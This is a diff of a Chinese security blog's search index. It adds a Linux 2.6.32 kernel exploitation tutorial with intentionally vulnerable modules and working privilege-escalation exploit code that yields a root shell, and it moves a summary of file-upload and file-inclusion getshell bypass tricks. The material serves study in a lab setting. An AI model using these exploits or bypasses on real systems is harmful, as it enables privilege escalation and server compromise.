@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Linux内核漏洞利用]]></title>
+    <url>%2F2018%2F10%2F16%2FLinux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[kernel exploitNULL Dereference漏洞代码#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/proc_fs.h&gt; void (*my_funptr)(void); int bug1_write(struct file *file,const char *buf,unsigned long len) { my_funptr(); return len; } static int __init null_dereference_init(void) { printk(KERN_ALERT &quot;null_dereference driver init!\n&quot;); create_proc_entry(&quot;bug1&quot;,0666,0)-&gt;write_proc = bug1_write; return 0; } static void __exit null_dereference_exit(void) { printk(KERN_ALERT &quot;null_dereference driver exit\n&quot;); } module_init(null_dereference_init); module_exit(null_dereference_exit); Makefileobj-m := null_dereference.o KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/ PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 代码中my_funptr函数指针指向不定，可以劫持之后执行代码，原理如下图所示。 把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。 POC#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/mman.h&gt; char payload[] = &quot;\xe9\xea\xbe\xad\x0b&quot;;//jmp 0xbadbeef int main(){ mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, payload, sizeof(payload)); int fd = open(&quot;/proc/bug1&quot;, O_WRONLY); write(fd, &quot;muhe&quot;, 4); return 0; } gcc -static poc.c -o poc 编译好之后把程序复制到busybox-1.19.4/_install/usrfind . | cpio -o –format=newc &gt; ../rootfs2.img 生成新的rootfsqemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../../busybox-1.19.4/rootfs.img -append “root=/dev/ram rdinit=/sbin/init” 启动系统。启动的时候按下ctrl+alt+2，然后gdb去连接。qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。gdb里反汇编查看当前执行的指令。 pdisass $pcexploit的思路是利用commit_creds(prepare_kernel_cred(0));给当前进程赋予root权限，kernel里面是不能直接执行system(“/bin/sh”);的。先取得commit_creds和prepare_kernel_cred地址。 grep commit_creds /proc/kallsyms grep prepare_kernel_cred /proc/kallsyms编写shellcode。得到shellcode。我们需要分配0地址空间然后放入shellcode，jmp过去执行shellcode，使当前进程有root权限，然后执行system(“/bin/sh”);，在程序返回用户态之后拿到一个root的shell。 EXP#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/mman.h&gt; char payload[] = &quot;\x31\xc0\xe8\xb9\x7f\x06\xc1\xe8\x14\x7e\x06\xc1\xc3&quot;; int main() { mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, payload, sizeof(payload)); int fd = open(&quot;/proc/bug1&quot;, O_WRONLY); write(fd, &quot;muhe&quot;, 4); system(&quot;/bin/sh&quot;);//get root shell return 0; } 新建用户去测试EXP。但是得到报错。这是因为2.6.32内核已经设置mmap_min_addr为4096作为缓解措施需要重新设置下mmap_min_addr：sysctl -w vm.mmap_min_addr=”0”重新运行EXP。成功拿到root shell。 Kernel Stack Overflow漏洞代码#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/proc_fs.h&gt; int bug2_write(struct file *file,const char *buf,unsigned long len) { char localbuf[8]; memcpy(localbuf,buf,len); return len; } static int __init stack_smashing_init(void) { printk(KERN_ALERT &quot;stack_smashing driver init!\n&quot;); create_proc_entry(&quot;bug2&quot;,0666,0)-&gt;write_proc = bug2_write; return 0; } static void __exit stack_smashing_exit(void) { printk(KERN_ALERT &quot;stack_smashing driver exit!\n&quot;); } module_init(stack_smashing_init); module_exit(stack_smashing_exit); Makefileobj-m := stack_smashing.o KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/ PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。 POC#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; int main(){ char buf[24] = {0}; memset(buf,&quot;A&quot;,24); *((void**)(buf + 20)) = 0x42424242; int fd = open(&quot;/proc/bug2&quot;,O_WRONLY); write(fd,buf,sizeof(buf)); } 可以看到payload结构很简单，直接就是buffer+eip。按照前面的步骤编译POC，然后构建文件系统，qemu起内核后，运行POC。我们编译的kernel默认开启canary的，如果直接这么去运行POC，会直接kernel panic，无法利用，所以需要关闭canary选项，重新编译一个内核。编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核。再起内核跑我们的POC，发现eip被覆盖成了0x42424242。模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。由于stack_smashing模块没有bss和data节区所以只需要指定text即可。qemu中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。运行POC之后发现eip被覆盖成了预期的值。 EXP拿到shell的思路还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，返回到用户模式执行iret指令。当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。当使用iret指令返回到一个不同的保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。栈上保存了trap frame，返回到用户模式的时候恢复信息从以下结构读取。 struct trap_frame { void* eip; // instruction pointer +0 uint32_t cs; // code segment +4 uint32_t eflags; // CPU flags +8 void* esp; // stack pointer +12 uint32_t ss; // stack segment +16 } __attribute__((packed)); 那么get root shell的思路就是先去执行commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是说先把当前进程权限提到root，然后执行起shell操作，那么我们就可以得到一个root的shell了。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; struct trap_frame{ void *eip; uint32_t cs; uint32_t eflags; void *esp; uint32_t ss; }__attribute__((packed)); struct trap_frame tf; void get_shell(void){ execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL); } void init_tf_work(void){ asm(&quot;pushl %cs;popl tf+4;&quot; //set cs &quot;pushfl;popl tf+8;&quot; //set eflags &quot;pushl %esp;popl tf+12;&quot; &quot;pushl %ss;popl tf+16;&quot;); tf.eip = &amp;get_shell; tf.esp -= 1024; } #define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067b20; void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067980; void payload(void){ //payload here commit_creds(prepare_kernel_cred(0)); asm(&quot;mov $tf,%esp;&quot; &quot;iret;&quot;); } int main(void){ char buf[24]; memset(buf,0x41,24); *((void**)(buf+20)) = &amp;payload; //set eip to payload init_tf_work(); write(1,buf,sizeof(buf)); int fd = open(&quot;/proc/bug2&quot;,O_WRONLY); //exploit write(fd,buf,sizeof(buf)); return 0; } 调试EXP先要确定模块代码节地址。gdb中如图设置。然后就可以返回到系统中，运行EXP程序了。对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。查看一下栈顶的情况。接下来单步进入我们的payload。这里可以看到先去执行commit_creds(prepare_kernel_cred(0))了。我们主要关注iret。红色部分就是我们伪造的tf结构。这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。成功拿到root shell。]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>linux内核漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[西门子PLC指令表]]></title>
     <url>%2F2018%2F08%2F05%2F%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8%2F</url>
     <content type="text"><![CDATA[位逻辑指令 时钟指令 通信指令 比较指令 转换指令 计数器指令 浮点数运算指令 整数运算指令 中断指令 逻辑运算指令 程序控制指令 传送指令 移位指令 字符串指令 表指令 定时器指令]]></content>
@@ -51,8 +62,8 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>modbus</tag>
         <tag>ICS</tag>
+        <tag>modbus</tag>
         <tag>ctf</tag>
         <tag>write up</tag>
       </tags>
@@ -77,9 +88,9 @@
         <category>工控安全</category>
       </categories>
       <tags>
+        <tag>ICS</tag>
         <tag>modbus</tag>
         <tag>工控协议</tag>
-        <tag>ICS</tag>
       </tags>
   </entry>
   <entry>
@@ -241,19 +252,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[文件上传常规漏洞总结]]></title>
-    <url>%2F2018%2F04%2F01%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[从文件上传到getshell一般找到文件上传页面，常规getshell思路:先检查服务器验证上传文件的逻辑，再想办法绕过 前台js验证——禁用js，burpsuit抓包绕过即可 后台检查MIME——抓包改MIME 后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传 .hatccess上传(apache)——创建一个.hatccseea文件设置命名有”php.gif”的文件当作php文件解析执行：&lt;FilesMatch “php.gif”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传的jpg文件都会以php格式解析：AddType application/x-httpd-php .jpg 后台检查文件后缀名—— 0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)1.php .png(空格改为00) IIS6.0解析漏洞文件 xxx.asp;.jpg (服务器默认不解析;号后面的内容) 文件夹 xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件) apache解析漏洞www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析) iis7.0和nginx解析漏洞www.xxx.com/logo.jpg/*.php(开启fix_pathinfo) 文件包含漏洞和利用 如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞 通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00 文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[第一次攻防训练赛小记]]></title>
     <url>%2F2018%2F04%2F01%2F%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0%2F</url>
     <content type="text"><![CDATA[&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下&emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数） 第一道题是semcms1.1版本，上网查到相应漏洞，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了… 第三题是一个微窗cms，有一个命令执行的洞。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag 第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂 这次比赛下来身为小白总结了几点：&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。 1234攻击方面： 拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。 白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。 还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。 12345防御方面：首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。 通用防御：上waf，直接吧不想要的请求比如post，get全部给禁掉等等； 设置目录权限，例如上传目录权限给死。 最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。 &emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…]]></content>
@@ -267,19 +265,32 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[文件上传常规漏洞总结]]></title>
+    <url>%2F2018%2F04%2F01%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[从文件上传到getshell一般找到文件上传页面，常规getshell思路:先检查服务器验证上传文件的逻辑，再想办法绕过 前台js验证——禁用js，burpsuit抓包绕过即可 后台检查MIME——抓包改MIME 后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传 .hatccess上传(apache)——创建一个.hatccseea文件设置命名有”php.gif”的文件当作php文件解析执行：&lt;FilesMatch “php.gif”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传的jpg文件都会以php格式解析：AddType application/x-httpd-php .jpg 后台检查文件后缀名—— 0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)1.php .png(空格改为00) IIS6.0解析漏洞文件 xxx.asp;.jpg (服务器默认不解析;号后面的内容) 文件夹 xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件) apache解析漏洞www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析) iis7.0和nginx解析漏洞www.xxx.com/logo.jpg/*.php(开启fix_pathinfo) 文件包含漏洞和利用 如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞 通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00 文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+        <tag>web</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>%2F404.html</url>
     <content type="text"><![CDATA[]]></content>
   </entry>
   <entry>
-    <title><![CDATA[about]]></title>
-    <url>%2Fabout%2Findex.html</url>
-    <content type="text"><![CDATA[本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙） 一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و 如有错误还请各位师傅批评指正。(´･◡･`)]]></content>
-  </entry>
-  <entry>
     <title><![CDATA[categories]]></title>
     <url>%2Fcategories%2Findex.html</url>
     <content type="text"><![CDATA[hi,man]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[about]]></title>
+    <url>%2Fabout%2Findex.html</url>
+    <content type="text"><![CDATA[本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙） 一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و 如有错误还请各位师傅批评指正。(´･◡･`)]]></content>
   </entry>
   <entry>
     <title><![CDATA[tags]]></title>
